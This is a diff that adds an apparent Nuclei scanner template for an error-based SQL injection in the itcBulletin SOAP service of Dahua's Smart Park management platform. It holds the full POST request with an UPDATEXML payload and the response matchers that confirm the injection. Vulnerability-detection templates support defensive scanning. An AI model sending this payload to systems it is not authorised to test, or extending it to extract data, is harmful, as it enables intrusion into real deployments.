@@ -1,0 +1,33 @@
+id: CVD-2023-1870
+
+info:
+  name: 大华智慧园区综合管理平台 itcbulletin SQL注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /portal/services/itcBulletin?wsdl HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        
+        <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
+        <s11:Body>
+        <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
+        <netMarkings>
+        (UPDATEXML(2326,
+        CONCAT(0x2e,0x71706a7171,(select 111*111),0x71706a7171),4027)))AND (2373=2373
+        </netMarkings>
+        </ns1:deleteBulletin>
+        </s11:Body>
+        </s11:Envelope>
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'12321') && contains(body,'XPATH syntax error')"
+
